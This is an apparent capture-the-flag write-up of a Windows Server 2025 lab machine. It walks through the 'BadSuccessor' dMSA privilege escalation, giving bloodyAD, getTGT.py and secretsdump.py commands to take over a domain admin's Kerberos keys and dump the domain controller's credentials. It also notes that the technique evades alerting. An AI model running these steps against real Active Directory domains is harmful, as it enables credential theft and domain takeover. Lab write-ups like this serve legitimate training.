# Eighteen

**Difficulty:** Hard | **OS:** Windows | **Completed:** April 2026

---

## Overview

Eighteen runs Windows Server 2025 and introduces the **BadSuccessor** attack path targeting delegated Managed Service Accounts (dMSA). Required `faketime +7h` for clock skew and `bloodyAD` with Kerberos flag for all LDAP operations.

---

## Enumeration

```bash
faketime '7+ hours' bloodyAD -u user -p 'pass' -d domain.htb \
  --dc-ip <DC> --kerberos get dMSA
```

Identified a dMSA object where our user had write access to `msDS-ManagedPasswordPreviousId`.

---

## BadSuccessor — dMSA Privilege Escalation

By setting the `msDS-ManagedPasswordPreviousId` attribute on a dMSA to point to a privileged account, an attacker with write access can inherit that account's Kerberos keys on the next password cycle.

```bash
# Set successor attribute to DA account
faketime '7+ hours' bloodyAD ... setAttribute dMSA \
  'msDS-ManagedPasswordPreviousId' <DA_DN>

# Request TGT as dMSA — inherits DA privileges
faketime '7+ hours' getTGT.py -dc-ip <DC> domain.htb/dMSA_account$ -aesKey <key>

# Use ticket
export KRB5CCNAME=dMSA.ccache
faketime '7+ hours' secretsdump.py -k -no-pass domain.htb/dMSA_account$@DC
```

---

## Lessons Learned

- Windows Server 2025 dMSA objects are a new attack surface — most tooling doesn't flag them yet, manual enumeration required
- `bloodyAD --kerberos` flag is non-optional when NTLM is disabled
- BadSuccessor is stealthy — attribute modification on a service account doesn't trip many alerting rules
